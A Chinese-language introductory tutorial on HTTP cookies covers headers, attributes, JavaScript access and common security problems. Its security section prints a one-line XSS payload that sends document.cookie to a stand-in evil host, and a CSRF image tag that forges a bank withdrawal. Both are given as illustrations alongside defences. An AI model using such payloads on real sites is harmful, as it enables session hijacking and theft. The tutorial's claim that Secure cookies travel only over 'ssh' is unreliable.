## 1、cookie是什么

cookie是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带，并发送回服务器。

因为http协议本身是无状态的，所以cookie的存在是为了记录状态信息。

cookie的作用主要有三个方面：

- 会话状态管理（用户登录、购物车等）
- 个性化设置（用户自定义设置、主题等）
- 浏览器行为跟踪（跟踪分析用户行为）

## 2、如何使用cookie

当服务器收到http请求时，可以在响应头中添加<code>Set-Cookie</code>选项。

浏览器收到响应后会保存下cookie，之后对该服务器的每一次请求都通过<code>Cookie</code>请求头将cookie信息发送给服务器

例如：
```http
//响应头
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: userId=123cfei23jd

//以后每次请求头
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: userId=123cfei23jd
```

### 2.1 cookie属性项

属性项 | 说明
---|---
name=value | 要保存的内容，格式为键值对
Expires | 过期时间，格式为时间戳
Max-Age | 有效期，和Expires功能相似
Domain | 主机，详情见注1
Path | 路径，详情见注2
Secure | 如果设置了这个属性，只会在ssh连接时会回传
HttpOnly | 如果设置了这个属性，将无法通过js脚步读取cookie
SameSite | Cookie 允许服务器要求某个 cookie 在跨站请求时不会被发送

注：
1. <code>domain</code>指定了哪些主机可以接受 Cookie。如果不指定，默认为 origin，不包含子域名。如果指定了Domain，则一般包含子域名
2. <code>path</code>指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F ("/") 作为路径分隔符，子路径也会被匹配。

> SameSite 可以有下面三种值：
> - None。浏览器会在同站请求、跨站请求下继续发送cookies，不区分大小写
> - Strict。浏览器只在相同访问站点发送cookie
> - Lax。与Strict类似，但用户从外部站点导航至URL（如通过link链接）时除外

> 以前SameSite属性没有设置时默认为none，现在大多数浏览器正在将默认值迁移至Lax

cookie设置例子如下：
```http
Set-Cookie: id=a3fWa; Path=/; Expires=Wed, 21 Oct 2021 07:28:00 GMT; Domain=mozilla.org; SameSite=Strict; Secure; HttpOnly
```

### 2.2 Js操作cookie

js通过Document.cookie访问cookie，但js创建的cookie不能包含HttpOnly标志，简单示例如下：

```js
// 1 设置cookie
document.cookie = "name=test";
document.cookie = "age=12";
console.log(document.cookie) 
//name=test; age=12;

// 2 获取指定名称的cookie
let name = document.cookie.replace(/(?:(?:^|.*;\s*)name\s*\=\s*([^;]*).*$)|^.*$/, "$1");
console.log(name)
//test
```

更多示例可以参考mdn对cookie增删改查的一个例子：https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie#%E4%B8%80%E4%B8%AA%E5%B0%8F%E6%A1%86%E6%9E%B6%EF%BC%9A%E4%B8%80%E4%B8%AA%E5%AE%8C%E6%95%B4%E6%94%AF%E6%8C%81unicode%E7%9A%84cookie%E8%AF%BB%E5%8F%96%E5%86%99%E5%85%A5%E5%99%A8

## 3、cookie的安全问题

众所周知cookie存在不少安全性问题，下面一一说明

### 3.1 会话劫持和XSS（跨站脚步攻击）

在web应用中，cookie常用来标识用户，如果cookie被窃取，就可能导致用户受到攻击

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

设置<code>HttpOnly</code>可以在一定程度上缓解此类攻击

当然更稳妥的办法还是对所有用户输入都做过滤或者危险字符转义

### 3.2 CSRF（跨站请求伪造）

比如在不安全的论坛上的一张图片，实际可能是这样：

```
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

如果你正好登录了银行账号并且cookie有效，而银行又没有任何其他验证，那么你的钱就有可能被自动转走。

设置<code>SameSite</code>为Strict可以一定程度的避免跨站请求，并且可以缩短cookie周期，增加敏感信息的验证

当然SameSite不能完全解决问题，并且不是所有浏览器兼容，可以采用token等身份验证方式，本篇主讲cookie，不再展开

### 3.3 中间人攻击或者从用户本地获取

cookie终究是存储在用户本地的数据，当用户机器处于不安全的环境，cookie是没办法做什么的

所以不要用cookie存储、传输敏感信息，一般存放脱敏或者加密过的信息

--- 

事实上cookie还有其他的安全性问题，并且没有提到隐私相关问题，还有很多可以深入的内容没有谈到，但总之，cookie入门篇就介绍到这里